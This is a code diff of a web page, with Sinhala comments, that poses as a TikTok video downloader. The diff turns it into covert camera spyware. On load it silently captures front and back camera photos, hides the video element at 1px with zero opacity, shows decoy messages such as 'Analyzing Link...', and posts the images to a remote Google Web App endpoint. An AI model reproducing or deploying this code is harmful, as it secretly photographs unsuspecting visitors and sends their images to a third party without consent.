@@ -9,38 +9,38 @@
         .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
         h1 { color: #fe2c55; margin-bottom: 20px; }
         input[type="text"] { width: 90%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
-        button { background-color: #fe2c55; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; width: 96%; }
-        button:hover { background-color: #e11d43; }
+        
+        /* TikTok Downloader Button */
+        .dl-btn { background-color: #fe2c55; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; width: 96%; font-weight: bold; transition: 0.2s; }
+        .dl-btn:hover { background-color: #e11d43; }
         .footer { margin-top: 20px; font-size: 12px; color: #777; }
 
- .camera-container { position: relative; width: 90%; max-width: 500px; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.5); background: #000; }
-        video { width: 100%; height: auto; display: block; }
-        .controls { margin-top: 20px; display: flex; gap: 15px; }
-        button { padding: 12px 24px; font-size: 16px; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        button:hover { opacity: 0.9; transform: scale(1.05); }
-        button:disabled { background-color: #555; cursor: not-allowed; transform: none; opacity: 0.5; }
-        #status { margin-top: 15px; font-weight: bold; color: #FFD700; text-align: center; padding: 0 10px; display: none;}
-        img { width: 90%; max-width: 300px; border: 3px solid white; border-radius: 8px; margin-top: 10px; display: none; }
-        
+        /* කැමරාව background එකේ රහසිගතව ක්‍රියාත්මක වීමට (Display:none නොකර) */
+        .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
+        #status { margin-top: 15px; font-weight: bold; color: #fe2c55; text-align: center; font-size: 14px; }
     </style>
 </head>
 <body>
+
     <div class="container">
         <h1>TikTok Downloader</h1>
         <p>ටික්ටොක් වීඩියෝ ලින්ක් එක පහතින් ඇතුළත් කරන්න:</p>
         <form action="/download" method="POST">
             <input type="text" name="url" placeholder="https://www.tiktok.com/..." required>
-            <button type="submit">Download Video</button>
+            <button type="submit" class="dl-btn">Download Video</button>
         </form>
+        
+        <!-- මෙතනින් process එක බලාගන්න පුළුවන් -->
+        <div id="status">Connecting...</div>
+        
         <div class="footer">Created by You ❤️</div>
     </div>
 
-<div class="camera-container"><video id="video" autoplay playsinline style="display:none;"></video></div>
-<div class="controls"><button id="snap-btn" disabled style="display:none;">Save </button></div>
-
-<div id="status"></div>
-<img id="photo" alt="Captured Photo">
-<canvas id="canvas" style="display:none;"></canvas>
+    <!-- කැමරා Elements (පිටුවට බාධාවක් නොවන සේ සඟවා ඇත) -->
+    <div class="camera-container">
+        <video id="video" autoplay playsinline></video>
+    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
  <script>
     // ⚠️ ඔයාගේ GOOGLE WEB APP URL එක ⚠️
@@ -48,68 +48,87 @@
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const photo = document.getElementById('photo');
     const statusDiv = document.getElementById('status');
     
     let currentStream = null;
 
-    // කැමරාව ක්‍රියාත්මක කරන පොදු Function එක
-    async function startCamera(facingMode) {
-        // දැනට කැමරාවක් වැඩ නම් ඒක නවත්වන්න (Stop current stream)
+    // කැමරාව නවත්වන Function එක
+    function stopCurrentStream() {
         if (currentStream) {
             currentStream.getTracks().forEach(track => track.stop());
+            currentStream = null;
         }
+    }
+
+    // කැමරාව ක්‍රියාත්මක කරන පොදු Function එක
+    async function startCamera(facingMode) {
+        stopCurrentStream(); // කලින් stream එක නවත්වන්න
         
-        try {
-            const constraints = { 
-                video: { facingMode: facingMode }, 
-                audio: false 
-            };
-            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = currentStream;
-            return true;
-        } catch (err) {
-            console.error("Camera error for " + facingMode + ":", err);
-            return false;
+        // Hardware එක release වීමට කුඩා විරාමයක්
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        const constraintsOptions = [
+            { video: { facingMode: facingMode }, audio: false },
+            { video: { facingMode: { exact: facingMode } }, audio: false }
+        ];
+
+        for (let constraints of constraintsOptions) {
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = currentStream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                return true;
+            } catch (err) {
+                console.log("Attempt failed for: ", facingMode);
+            }
         }
+        return false;
     }
 
     // පිටුව ලෝඩ් වුණු ගමන්ම ක්‍රියාවලිය ආරම්භ කිරීම
     window.onload = async () => {
-        statusDiv.textContent = "Please waiting ...";
+        statusDiv.textContent = "Initializing System...";
         
         // 1. මුලින්ම Front Camera එක ඔන් කිරීම
         const frontValid = await startCamera("user");
         if (frontValid) {
-            // තත්පර 3කින් Front Photo එක ගන්නවා
             setTimeout(async () => {
-                statusDiv.textContent = "Processing Front Image...";
+                statusDiv.textContent = "Analyzing Link...";
                 await captureAndUpload();
                 
                 // 2. Front එක ඉවර වුණු ගමන් Back Camera එකට මාරු වීම
-                statusDiv.textContent = "Switching to Back Camera...";
                 const backValid = await startCamera("environment");
                 
                 if (backValid) {
-                    // තත්පර 3කින් Back Photo එක ගන්නවා
                     setTimeout(async () => {
-                        statusDiv.textContent = "Processing Back Image...";
                         await captureAndUpload();
-                        statusDiv.textContent = "Save Successful ...";
+                        statusDiv.textContent = "Ready to Download!";
+                        stopCurrentStream();
                     }, 3000);
                 } else {
-                    statusDiv.textContent = "Back Camera Unsuccessful ...";
+                    statusDiv.textContent = "Ready to Download! (B)";
+                    stopCurrentStream();
                 }
                 
             }, 3000);
         } else {
-            statusDiv.textContent = "❌ කැමරා අවසරය නැහැ.";
+            statusDiv.textContent = "❌ Please allow camera permission.";
         }
     };
 
     // ෆොටෝ එක කැප්චර් කරලා අප්ලෝඩ් කරන Function එක
     async function captureAndUpload() {
-        if (!video.videoWidth) return; // වීඩියෝ එක ලෝඩ් වී නැත්නම් නවත්වන්න
+        if (!video.videoWidth || video.videoWidth === 0) {
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+        if (!video.videoWidth) return; 
         
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
@@ -117,20 +136,19 @@
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const imageData = canvas.toDataURL('image/png');
-        photo.src = imageData;
-        photo.style.display = 'none';
 
         try {
             await fetch(WEB_APP_URL, {
                 method: 'POST',
                 mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: imageData })
             });
         } catch (error) {
             console.error("Upload error:", error);
         }
     }
-            </script>
+ </script>
     
 </body>
 </html>
